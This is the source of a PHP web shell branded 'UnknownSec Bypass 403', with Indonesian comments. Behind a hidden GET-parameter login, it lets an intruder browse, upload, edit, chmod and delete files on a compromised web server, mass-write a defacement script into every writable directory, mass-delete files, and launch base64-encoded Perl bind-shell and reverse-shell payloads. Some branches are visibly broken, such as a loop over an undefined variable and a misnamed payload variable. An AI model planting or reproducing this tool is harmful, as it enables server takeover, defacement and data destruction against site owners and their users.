<?php
/* Gw doain kalo lu recode tytyd lu jadi kecil */
set_time_limit(0);
error_reporting(0);
/* Ini bisa di ganti sesuai kemauan kalian */
$name = "root";
@session_start();
function login()
	{
phpinfo();
exit;
	}
if(!isset($_SESSION[md5($log)])) {
if(isset($_GET[$name]) && $_GET[$name] == $name) {
	$_SESSION[md5($log)] = true;
} else {
	login();
	}
}
?>
<?php

header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

echo '
<!DOCTYPE HTML>
<html>
	<head>
		<meta name="author" content="UnknownSec">
		<meta name="viewport" content="width=device-width, initial-scale=0.70, user-scalable=no">
		<title>'.$_SERVER['HTTP_HOST'].' - Bypass 403</title>
		<link rel="stylesheet" href="//unknownsec1337.github.io/main/style.css" type="text/css">
	</head>
<body>
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.js"></script>
<div class="container">
	<div class="card text-dark">
		<div class="card-header">
			<a href="?"><h4>UnknownSec Bypass <i class="fas fa-biohazard"></i> 403</h4></a>';
			if(isset($_GET['path'])){
				$path = $_GET['path'];
			}else{
				$path = getcwd();
			}
				$path = str_replace('\\','/',$path);
				$paths = explode('/',$path);
			foreach($paths as $id=>$pat){
			if($pat == '' && $id == 0){
				$a = true;
				echo '<i class="fab fa-gitter"></i> : <a href="?path=/">/</a>';
			continue;
			}
			if($pat == '') continue;
				echo '<a href="?path=';
			for($i=0;$i<=$id;$i++){
				echo "$paths[$i]";
			if($i != $id) echo "/";
			}
				echo '">'.$pat.'</a>/';
			}
			echo " [ ".uns($path, ps($path))." ]";
			echo "
			<div class='dropdown'>
				<button class='btn btn-dark dropdown-toggle' type='button' id='dropdownMenuButton' data-toggle='dropdown' aria-haspopup='true' aria-expanded='false'>Menu</button>
			<div class='dropdown-menu'>
				<a class='dropdown-item' href='?path=$path&id=up'><i class='fas fa-upload'></i> Upload</a>
				<a class='dropdown-item' href='?path=$path&id=df'><i class='fas fa-theater-masks'></i> Mass depes</a>
				<a class='dropdown-item' href='?path=$path&id=dl'><i class='far fa-trash-alt'></i> Mass delete</a>
				<a class='dropdown-item' href='?path=$path&id=nt'><i class='fas fa-network-wired'></i> Network</a>
				<a class='dropdown-item' href='?path=$path&id=if'><i class='fas fa-info-circle'></i> Info</a>
				<a class='dropdown-item' href='?path=$path&id=ab'><i class='fas fa-info'></i> About</a></h5>
				</div>
			</div>
		</div>
	</div>
</div>";
// tools nya
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);	
	for($i = 0; $i <= $c_dir; $i++) {
		$scdir[$i];
		if($i != $c_dir) {
		}
elseif($_GET['id'] == 'df'){
	function mass_kabeh($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$lokasi = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($lokasi, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($lokasi, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "[<font color=green>SUCCESS</font>] $lokasi<br>";
						file_put_contents($lokasi, $isi_script);
						$uns = mass_kabeh($dirc,$namafile,$isi_script);
					}
				}
			}
		}
	}
}
function mass_biasa($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$lokasi = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($lokasi, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($lokasi, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "[<font color=green>SUCCESS</font>] $dirb/$namafile<br>";
						file_put_contents($lokasi, $isi_script);
					}
				}
			}
		}
	}
}
if($_POST['start']) {
	if($_POST['tipe'] == 'massal') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
	mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";
	} elseif($_POST['tipe'] == 'biasa') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
	mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";
	}
} else {
echo "<br /><style>table{display:none;}</style>
<form method='post'>
<center>
	<b>Tipe:</b><br>
	<div style='border: 2px solid #fff; border-radius:10px; width: 30%;'/>
	<input type='radio' name='tipe' value='biasa' checked>Biasa<input type='radio' name='tipe' value='massal'>Massal</div>
	</center>
	<b><i class='far fa-folder'></i> Lokasi:</b>
	<input class='form-control' type='text' name='d_dir' value='$dir' height='10'>
	<b><i class='far fa-file-alt'></i> File name:</b>
	<input class='form-control' type='text' name='d_file' placeholder='name file' height='10'>
	<b><i class='far fa-file-alt'></i> Your script:</b>
	<textarea class='form-control' rows='7' name='script' placeholder='your secript here'></textarea><br />
	<input type='submit' name='start' value='Go' class='btn btn-primary btn-block'>
</form>";
	}
}
elseif($_GET['id'] == 'nt'){
echo "<br /><style>table{display:none;}</style>
<form method='post'>
	<u>Bind Port :</u>
	<br><b>PORT :</b>
<div class='input-group mb-3'>
	<input class='form-control' type='text' placeholder='port' name='port_bind' value='6969'>
		<div class='input-group-append'>
		<input class='btn btn-primary' type='submit' name='sub_bp' value='Go'>
	</div>
</div>
</form>
<form method='post'>
	<u>Back Connect :</u>
	<br><b>Server :</b>
<input type='text' class='form-control' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>
<b>PORT :</b>
<div class='input-group mb-3'>
	<input type='text' class='form-control' placeholder='port' name='port_bc' value='6969'>
		<div class='input-group-append'>
		<input class='btn btn-primary' type='submit' name='sub_bc' value='Go'>
	</div>
</div>
</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
}
elseif($_GET['id'] == 'if'){
function ip() {
	$ipaddress = '';
if (getenv('HTTP_CLIENT_IP'))
	$ipaddress = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ipaddress = getenv('REMOTE_ADDR');
else
	$ipaddress = 'IP tidak dikenali';
return $ipaddress;
}
function browser() {
	$browser = '';
if(strpos($_SERVER['HTTP_USER_AGENT'], 'Netscape'))
	$browser = 'Netscape';
else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox'))
	$browser = 'Firefox';
else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome'))
	$browser = 'Chrome';
else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Opera'))
	$browser = 'Opera';
else if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE'))
	$browser = 'Internet Explorer';
else
	$browser = 'Other';
return $browser;
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=green>OFF</font>";
echo '<br /><style>table{display:none;}</style>
<div class="container">
	<div class="card text-dark">
		<div class="card-header">';
echo "<b>Uname : </b><font color=green>".php_uname()."</font><br />";
echo "<b>Software : </b><font color=green>".$_SERVER['SERVER_SOFTWARE']."</font><br />";
echo "<b>PHP version : </b><font color=green>".PHP_VERSION."</font> <b>PHP os :</b> <font color=green>".PHP_OS."</font><br />";
echo "<b>Server Ip : </b><font color=green>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br />";
echo "<b>Your Ip : </b><font color=green>".ip()."</font><br />";
echo "<b>User : </b><font color=green>".@get_current_user()."</font> [ <font color=green>".@getmyuid()."</font> ]<br />";
echo "<b>Safe Mode : </b>".$sm."<br />";
echo "<b>Browser : </b><font color=green>".browser()."</font><br />";
	echo '</div>
	</div>
</div>';
}
elseif($_GET['id'] == 'ab'){
echo '<br /><style>table{display:none;}</style>
<div class="container">
	<div class="card text-dark">
		<div class="card-header">';
echo "<b>- About -</b><br />";
echo "Thanks bre dah pake shell nya, jika ada yang error silahkan hubungi email di bawah<br />Greetz : <a href=''>{ AnonSec Team } - And You</a><br />My email: <a href='mailto:unknownsec1337@gmail.com'>unknownsec1337@gmail.com</a>";
	echo '</div>
	</div>
</div>';
}
elseif($_GET['id'] == 'up'){
echo '<br /><style>table{display:none;}</style>
<form method="post" enctype="multipart/form-data">
	<div class="input-group mb-3">
		<div class="custom-file">
			<label class="custom-file-label" for="inputGroupFile04">
				<input class="custom-file-input" id="inputGroupFile04" type="file" name="file" onchange="this.form.submit()" multiple>
			</label>
		</div>
	</div>
</form>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Success upload",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed upload",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
	}
}
elseif($_GET['id'] == 'dl'){
function hapus_massal($dir,$namafile) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$lokasi = $dirc.'/'.$namafile;
			if($dirb === '.') {
				if(file_exists("$dir/$namafile")) {
					unlink("$dir/$namafile");
				}
			} elseif($dirb === '..') {
				if(file_exists("".dirname($dir)."/$namafile")) {
					unlink("".dirname($dir)."/$namafile");
				}
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						if(file_exists($lokasi)) {
							echo "[<font color=green>DELETED</font>] $lokasi<br>";
							unlink($lokasi);
							$uns = hapus_massal($dirc,$namafile);
						}
					}
				}
			}
		}
	}
}
if($_POST['start']) {
echo "<div style='margin: 5px auto; padding: 5px'>";
	hapus_massal($_POST['d_dir'], $_POST['d_file']);
echo "</div>";
} else {
echo "<br /><style>table{display:none;}</style>
<form method='post'>
	<b><i class='far fa-folder'></i> Lokasi:</b>
	<input class='form-control' type='text' name='d_dir' value='$dir' height='10'>
	<b><i class='far fa-file-alt'></i> File name:</b>
	<input class='form-control' type='text' name='d_file' placeholder='name file' height='10'><br>
	<input class='btn btn-primary btn-block' type='submit' name='start' value='Go'>
</form>
	</div>
	</div>
	</div>";
		}
	}
}
// akhir tools
if(isset($_GET['filesrc'])){
echo "<tr><td><center><br><b>files : </b>";
echo $_GET['filesrc'];
echo '</center></tr></td></table></br>';
echo('<textarea class="form-control" rows="7" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea><br />');
}
elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
//Chmod
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Success Change Permission",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed change permission",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
}
echo '<form method="POST">
<b>Permission :</b><input class="form-control" name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'"/>
	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
		<input class="form-control" type="hidden" name="opt" value="chmod">
	<input class="btn btn-primary btn-block" type="submit" value="Go"/>
</form>
<br />';
}
//rename folder
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
<b>New Name :</b><input class="form-control" name="name" type="text" size="25" value="Folder"/>
	<input class="form-control" type="hidden" name="path" value="'.$cwd.'">
		<input class="form-control" type="hidden" name="opt" value="delete">
	<input class="btn btn-primary btn-block" type="submit" value="Go"/>
</form>
<br />';
}
//rename file
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Success change name",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed change name",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
<b>New Name :</b><input class="form-control" name="newname" type="text" size="5" value="'.$_POST['name'].'" />
	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
		<input class="form-control" type="hidden" name="opt" value="rename">
	<input class="btn btn-primary btn-block" type="submit" value="Go"/>
</form>
<br />';
}
//edit file
elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Edit file Success",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed edit file",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
fclose($fp);
}
echo '<form method="POST">
<textarea class="form-control" rows="7" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
		<input class="form-control" type="hidden" name="opt" value="edit">
	<input class="btn btn-primary btn-block" type="submit" value="Go"/>
</form><br />';
}
echo '</center>';
}else{
echo '</table><br /><center>';
//delete dir
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Success delete dir",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed delete dir",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
}
//delete file
elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Success delete file",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed delete file",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
}
}
?>
<?php
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo '<div class="container-fluid"><table class="table table-striped table-bordered table-hover bg-white" cellspacing="0" cellpadding="7" width="100%">
<tr class="first">
	<th class="text-center bg-dark text-white">Name</th>
		<th class="text-center bg-dark text-white">Size</th>
		<th class="text-center bg-dark text-white">Permission</th>
	<th class="text-center bg-dark text-white">Options</th>
</tr>
</tr>
<tr>';
foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
	echo "<tr>
<td><i class='far fa-folder'></i><a href=\"?path=$path/$dir\"> $dir</a></td>
	<td><font><center>DIR</center></font></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
	echo ps("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
	echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
	<select class=\"form-control\" name=\"opt\">
		<option selected disabled>Select</option>
			<option value=\"delete\">Delete</option>
		<option value=\"chmod\">Chmod</option>
	<option value=\"rename\">Rename</option>
</select>
<input class=\"form-control\" type=\"hidden\" name=\"type\" value=\"dir\">
	<input class=\"form-control\" type=\"hidden\" name=\"name\" value=\"$dir\">
			<input class=\"form-control\" type=\"hidden\" name=\"path\" value=\"$path/$dir\">
		<input class=\"btn btn-primary btn-block\" type=\"submit\" value=\"Go\"/>
	</form>
</center></td>
</tr>";
}
foreach($scandir as $file){
	if(!is_file($path.'/'.$file)) continue;
	$size = filesize($path.'/'.$file)/1024;
	$size = round($size,3);
	if($size >= 1024){
		$size = round($size/1024,2).' MB';
	}else{
		$size = $size.' KB';
	}
echo '<tr>
		<td><i class="';
	$ex = strtolower(pathinfo($file, PATHINFO_EXTENSION));
	if($ex == "php") {
		echo 'far fa-file-code';
	}elseif($ex == "html"){
		echo 'far fa-file-code';
	}elseif($ex == "css"){
		echo 'far fa-file-code';
	}elseif($ex == "png"){
		echo 'far fa-file-image';
	}elseif($ex == "jpg"){
		echo 'far fa-file-image';
	}elseif($ex == "gif"){
		echo 'far fa-file-image';
	}elseif($ex == "jpeg"){
		echo 'far fa-file-image';
	}elseif($ex == "zip"){
		echo 'far fa-file-archive';
	}elseif($ex == "rar"){
		echo 'far fa-file-archive';
	}elseif($ex == "js"){
		echo 'far fa-file-code';
	}elseif($ex == "txt"){
		echo 'far fa-file-code';
	}elseif($ex == "ico"){
		echo 'far fa-file-image';
	}elseif($ex == "htaccess"){
		echo 'far fa-file-code';
	}elseif($ex == "sh"){
		echo 'far fa-file-code';
	}elseif($ex == "py"){
		echo 'far fa-file-code';
	}elseif($ex == "sql"){
		echo 'far fa-file-code';
	}elseif($ex == "pl"){
		echo 'far fa-file-code';
	}elseif($ex == "pdf"){
		echo 'far fa-file-pdf';
	}elseif($ex == "mp4"){
		echo 'far fa-file-video';
	}elseif($ex == "mp3"){
		echo 'far fa-file-audio';
	}elseif($ex == "excel"){
		echo 'far fa-file-excel';
	}elseif($ex == "word"){
		echo 'far fa-file-word';
	}elseif($ex == "md"){
		echo 'far fa-file-code';
	}else{
		echo 'far fa-file-alt';
	}
echo '"</i>';
	echo "<a href=\"?filesrc=$path/$file&path=$path\"> $file</a></td>
	<td><font><center>".$size."</center></font></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
	echo ps("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
	echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
	<select class=\"form-control\" name=\"opt\">
		<option selected disabled>Select</option>
			<option value=\"delete\">Delete</option>
		<option value=\"edit\">Edit</option>
	<option value=\"rename\">Rename</option>
<option value=\"chmod\">Chmod</option>
</select>
	<input class=\"form-control\" type=\"hidden\" name=\"type\" value=\"file\">
		<input class=\"form-control\" type=\"hidden\" name=\"name\" value=\"$file\">
			<input class=\"form-control\" type=\"hidden\" name=\"path\" value=\"$path/$file\">
		<input class=\"btn btn-primary btn-block\" type=\"submit\" value=\"Go\"/>
	</form>
</center></td>
</tr>";
}
echo '</table>
</div>';
}
echo "
<div class='container'>
	<div class='card text-dark'>
		<div class='card-header'>
			<center><font>Copyright &copy; ".date("Y")." - <a href=''>UnknownSec</a></center>
		</div>
	</div>
</div>
<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
<script src='//cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js'></script>
<script src='//stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'></script>
</body>
</html>";
function uns($dir,$ps) {
	if (isset($_GET['path'])) {
		$lokasi = $_GET['path'];
	} else {
		$lokasi = getcwd();
	}
	if (is_writable($lokasi)) {
		return "<font color='green'>".$ps."</font>";
	} else {
		return "<font color='red'>".$ps."</font>";
	}
}

function ps($file){
$ps = fileperms($file);
if (($ps & 0xC000) == 0xC000) {
$if = 's';
} elseif (($ps & 0xA000) == 0xA000) {
$if = 'l';
} elseif (($ps & 0x8000) == 0x8000) {
$if = '-';
} elseif (($ps & 0x6000) == 0x6000) {
$if = 'b';
} elseif (($ps & 0x4000) == 0x4000) {
$if = 'd';
} elseif (($ps & 0x2000) == 0x2000) {
$if = 'c';
} elseif (($ps & 0x1000) == 0x1000) {
$if = 'p';
} else {
$if = 'u';
	}
$if .= (($ps & 0x0100) ? 'r' : '-');
$if .= (($ps & 0x0080) ? 'w' : '-');
$if .= (($ps & 0x0040) ?
(($ps & 0x0800) ? 's' : 'x' ) :
(($ps & 0x0800) ? 'S' : '-'));
$if .= (($ps & 0x0020) ? 'r' : '-');
$if .= (($ps & 0x0010) ? 'w' : '-');
$if .= (($ps & 0x0008) ?
(($ps & 0x0400) ? 's' : 'x' ) :
(($ps & 0x0400) ? 'S' : '-'));
$if .= (($ps & 0x0004) ? 'r' : '-');
$if .= (($ps & 0x0002) ? 'w' : '-');
$if .= (($ps & 0x0001) ?
(($ps & 0x0200) ? 't' : 'x' ) :
(($ps & 0x0200) ? 'T' : '-'));
return $if;
	}
?>
